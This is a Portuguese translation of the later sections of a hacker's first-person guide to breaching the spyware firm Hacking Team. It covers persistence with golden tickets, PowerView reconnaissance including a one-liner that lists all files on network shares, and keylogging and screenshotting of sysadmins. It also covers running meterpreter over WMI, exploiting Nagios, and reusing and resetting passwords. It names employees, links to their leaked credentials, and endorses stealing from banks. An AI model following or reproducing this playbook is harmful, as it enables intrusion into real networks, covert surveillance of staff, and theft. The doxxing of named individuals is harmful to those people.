Depois de ter acesso, você deseja mantê-lo. Na verdade, a persistência é apenas um desafio para idiotas como a Hacking Team que tem como alvo ativistas e outros indivíduos. Para hackear empresas, a persistência não é necessária, pois as empresas nunca dormem. Eu sempre uso o estilo "persistência" do Duqu 2, executando na RAM em alguns servidores de alto tempo de atividade. Na chance de que todos eles reiniciem ao mesmo tempo, eu tenho senhas e um ticket dourado[1] como acesso de backup. Você pode ler mais sobre as diferentes técnicas de persistência no Windows aqui[2][3][4]. Mas para empresas de hackers, não é necessário e aumenta o risco de detecção.

[1] http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/

[2] http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/

[3] http://www.hexacorn.com/blog/category/autostart-persistence/

[4] https://blog.netspi.com/tag/persistence/

----[ 13.3 - Reconhecimento interno  ]------------------------------------------

A melhor ferramenta hoje em dia para entender as redes Windows é o Powerview[1]. Vale a pena ler tudo o que foi escrito por seu autor[2], principalmente[3],[4],[5] e[6]. O Powershell em si também é bastante poderoso[7]. Como ainda existem muitos servidores Windows 2000 e 2003 sem o PowerShell, você também precisa aprender a velha escola[8], com programas como o netview.exe[9] ou o "net view" embutido no Windows. Outras técnicas que gosto são:

1) Baixando uma lista de nomes de arquivo

   Com uma conta de Domain Admin, você pode baixar uma lista de todos os nomes de arquivos na rede com powerview:

~~~
   Invoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ |
   select-string '^(.*) \t-' | %{dir -recurse $_.Matches[0].Groups[1] |
   select fullname | out-file -append files.txt}
~~~

   Posteriormente, você poderá lê-lo à vontade e escolher os arquivos que deseja baixar. 

2) Lendo e-mail

   Como já vimos, você pode baixar o e-mail com o PowerShell, e ele contém muitas informações úteis.
   
3) Lendo o sharepoint

   É outro local onde muitas empresas armazenam muitas informações importantes. Ele também pode ser baixado com o PowerShell[10].

4) Diretório Ativo[11]

   Ele contém muitas informações úteis sobre usuários e computadores. Sem ser um administrador de domínio, você já pode obter muitas informações com o powerview e outras ferramentas[12]. Depois de obter o Domain Admin, você deve exportar todas as informações do AD com csvde ou outra ferramenta.
   
5) Espionar os funcionários

   Um dos meus hobbies favoritos é caçar sysadmins. Espionar Christian Pozzi (um dos sysadmins do Hacking Team) me deu acesso a um servidor Nagios que me deu acesso à rete sviluppo (rede de desenvolvimento com o código-fonte do RCS). Com uma combinação simples de Get-Keystrokes e Get-TimedScreenshot do PowerSploit[13], Do-Exfiltration do nishang[14] e GPO, você pode espionar qualquer funcionário ou até mesmo o domínio inteiro.

[1] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView

[2] http://www.harmj0y.net/blog/tag/powerview/

[3] http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/

[4] http://www.harmj0y.net/blog/redteaming/powerview-2-0/

[5] http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/

[6] http://www.slideshare.net/harmj0y/i-have-the-powerview

[7] https://adsecurity.org/?p=2535

[8] https://www.youtube.com/watch?v=rpwrKhgMd7E

[9] https://github.com/mubix/netview

[10] https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-bulk-downloads-of-files-in-sharepoint/

[11] https://adsecurity.org/?page_id=41

[12] http://www.darkoperator.com/?tag=Active+Directory

[13] https://github.com/PowerShellMafia/PowerSploit

[14] https://github.com/samratashok/nishang

--[ 14 - Caçando Sysadmins ]----------------------------------------------------

Lendo a documentação deles sobre sua infraestrutura[1], vi que ainda me faltava acesso a algo importante - a "Rete Sviluppo", uma rede isolada com o código fonte para RCS. Os administradores de sistemas de uma empresa sempre têm acesso a tudo, então pesquisei nos computadores de Mauro Romeo e Christian Pozzi para ver como eles administram a rede Sviluppo e para ver se havia algum outro sistema interessante que eu deveria investigar. Era simples acessar seus computadores, pois eles faziam parte do domínio do Windows onde eu já tinha acesso de administrador. O computador do Mauro Romeo não tinha nenhuma porta aberta, então eu abri a porta para WMI[2] e executei o meterpreter[3]. Além de keylogging e screen scraping com Get-Keystrokes e Get-TimeScreenshot, usei muitos módulos /gather/ do metasploit, CredMan.ps1[4], e procurei por arquivos interessantes[5]. Ao ver que Pozzi tinha um volume Truecrypt, esperei até que ele o montasse e copiei os arquivos. Muitos zombaram das senhas fracas de Christian Pozzi (e de Christian Pozzi em geral, ele fornece muito material[6][7][8][9]). Eu os inclui no vazamento como uma pista falsa e para rir dele. A realidade é que mimikatz e keyloggers visualizam todas as senhas igualmente.

[1] http://hacking.technology/Hacked%20Team/FileServer/FileServer/Hackingteam/InfrastrutturaIT/

[2] http://www.hammer-software.com/wmigphowto.shtml

[3] https://www.trustedsec.com/june-2015/no_psexec_needed/

[4] https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde

[5] http://pwnwiki.io/#!presence/windows/find_files.md

[6] http://archive.is/TbaPy

[7] http://hacking.technology/Hacked%20Team/c.pozzi/screenshots/

[8] http://hacking.technology/Hacked%20Team/c.pozzi/Desktop/you.txt

[9] http://hacking.technology/Hacked%20Team/c.pozzi/credentials/

--[ 15 - A Ponte ]-----------------------------------------------------------

Dentro do volume Truecrypt de Christian Pozzi, havia um arquivo de texto com muitas senhas[1]. Uma delas era para um servidor Nagios totalmente automatizado, que tinha acesso à rede Sviluppo para monitorá-la. Eu encontrei a ponte que precisava. O arquivo de texto tinha apenas a senha para a interface da web, mas havia um exploit de execução de código público[2] (é um exploit não autenticado, mas requer que pelo menos um usuário tenha uma sessão iniciada, para a qual usei a senha do arquivo de texto )

[1] http://hacking.technology/Hacked%20Team/c.pozzi/Truecrypt%20Volume/Login%20HT.txt

[2] http://seclists.org/fulldisclosure/2014/Oct/78

--[ 16 - Reutilizar e redefindo senhas ]--------------------------------------

Lendo os e-mails, vi Daniele Milan concedendo acesso aos repositórios git. Eu já tinha sua senha do windows graças ao mimikatz. Eu tentei no servidor git e funcionou. Então tentei sudo e funcionou. Para o servidor gitlab e sua conta no Twitter, usei a função "esqueci minha senha" junto com meu acesso ao servidor de e-mail para redefinir as senhas.

--[ 17 - Conclusão ]-----------------------------------------------------------

Isso é tudo o que é preciso para derrubar uma empresa e impedir os abusos de direitos humanos. Essa é a beleza e assimetria do hacking: com 100 horas de trabalho, uma pessoa pode desfazer anos de trabalho de uma empresa multimilionária. Hackear dá ao azarão a chance de lutar e vencer.

Os guias de hacking muitas vezes terminam com uma isenção de responsabilidade: essas informações são apenas para fins educacionais, seja um hacker ético, não ataque sistemas para os quais você não tem permissão, etc. Direi o mesmo, mas com uma concepção mais rebelde de "ethical" hacking. Vazamento de documentos, expropriação de dinheiro de bancos e trabalho para proteger os computadores de pessoas comuns é um hacking ético. No entanto, a maioria das pessoas que se autodenominam "hackers éticos" apenas trabalham para proteger aqueles que pagam suas altas taxas de consultoria, que geralmente são os que mais merecem ser hackeados.

A Hacking Team se via como parte de uma longa linha de design italiano inspirado[1]. Vejo Vincenzetti, sua empresa, seus camaradas na polícia, Carabinieri e no governo, como parte de uma longa tradição de fascismo italiano. Gostaria de dedicar este guia às vítimas do ataque à escola Armando Diaz e a todos aqueles que tiveram seu sangue derramado por fascistas italianos.

[1] https://twitter.com/coracurrier/status/618104723263090688

--[ 18 - Contato ]--------------------------------------------------------------

Para me enviar tentativas de spear phishing, ameaças de morte em italiano[1][2] e para me dar *0-days* ou acesso dentro de bancos, empresas, governos, etc.

[1] http://andres.delgado.ec/2016/01/15/el-miedo-de-vigilar-a-los-vigilantes/

[2] https://twitter.com/CthulhuSec/status/619459002854977537

apenas e-mail criptografado por favor:
https://securityinabox.org/es/thunderbird_usarenigmail
~~~
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQENBFVp37MBCACu0rMiDtOtn98NurHUPYyI3Fua+bmF2E7OUihTodv4F/N04KKx
vDZlhKfgeLVSns5oSimBKhv4Z2bzvvc1w/00JH7UTLcZNbt9WGxtLEs+C+jF9j2g
27QIfOJGLFhzYm2GYWIiKr88y95YLJxvrMNmJEDwonTECY68RNaoohjy/TcdWA8x
+fCM4OHxM4AwkqqbaAtqUwAJ3Wxr+Hr/3KV+UNV1lBPlGGVSnV+OA4m8XWaPE73h
VYMVbIkJzOXK9enaXyiGKL8LdOHonz5LaGraRousmiu8JCc6HwLHWJLrkcTI9lP8
Ms3gckaJ30JnPc/qGSaFqvl4pJbx/CK6CwqrABEBAAG0IEhhY2sgQmFjayEgPGhh
Y2tiYWNrQHJpc2V1cC5uZXQ+iQE3BBMBCgAhBQJXAvPFAhsDBQsJCAcDBRUKCQgL
BRYCAwEAAh4BAheAAAoJEDScPRHoqSXQoTwIAI8YFRdTptbyEl6Khk2h8+cr3tac
QdqVNDdp6nbP2rVPW+o3DeTNg0R+87NAlGWPg17VWxsYoa4ZwKHdD/tTNPk0Sldf
cQE+IBfSaO0084d6nvSYTpd6iWBvCgJ1iQQwCq0oTgROzDURvWZ6lwyTZ8XK1KF0
JCloCSnbXB8cCemXnQLZwjGvBVgQyaF49rHYn9+edsudn341oPB+7LK7l8vj5Pys
4eauRd/XzYqxqNzlQ5ea6MZuZZL9PX8eN2obJzGaK4qvxQ31uDh/YiP3MeBzFJX8
X2NYUOYWm3oxiGQohoAn//BVHtk2Xf7hxAY4bbDEQEoDLSPybZEXugzM6gC5AQ0E
VWnfswEIANaqa8fFyiiXYWJVizUsVGbjTTO7WfuNflg4F/q/HQBYfl4ne3edL2Ai
oHOGg0OMNuhNrs56eLRyB/6IjM3TCcfn074HL37eDT0Z9p+rbxPDPFOJAMFYyyjm
n5a6HfmctRzjEXccKFaqlwalhnRP6MRFZGKU6+x1nXbiW8sqGEH0a/VdCR3/CY5F
Pbvmhh894wOzivUlP86TwjWGxLu1kHFo7JDgp8YkRGsXv0mvFav70QXtHllxOAy9
WlBP72gPyiWQ/fSUuoM+WDrMZZ9ETt0j3Uwx0Wo42ZoOXmbAd2jgJXSI9+9e4YUo
jYYjoU4ZuX77iM3+VWW1J1xJujOXJ/sAEQEAAYkBHwQYAQIACQUCVWnfswIbDAAK
CRA0nD0R6Kkl0ArYB/47LnABkz/t6M1PwOFvDN3e2JNgS1QV2YpBdog1hQj6RiEA
OoeQKXTEYaymUwYXadSj7oCFRSyhYRvSMb4GZBa1bo8RxrrTVa0vZk8uA0DB1ZZR
LWvSR7nwcUkZglZCq3Jpmsy1VLjCrMC4hXnFeGi9AX1fh28RYHudh8pecnGKh+Gi
JKp0XtOqGF5NH/Zdgz6t+Z8U++vuwWQaubMJTRdMTGhaRv+jIzKOiO9YtPNamHRq
Mf2vA3oqf22vgWQbK1MOK/4Tp6MGg/VR2SaKAsqyAZC7l5TeoSPN5HdEgA7u5GpB
D0lLGUSkx24yD1sIAGEZ4B57VZNBS0az8HoQeF0k
=E5+y

-----END PGP PUBLIC KEY BLOCK-----
~~~
Se não for você, quem? Se não agora, quando?
----------------------------------

~~~
| | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
| |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
|  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
|_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
~~~

Fonte: [HackBack - A DIY Guide I](https://www.exploit-db.com/papers/41915)
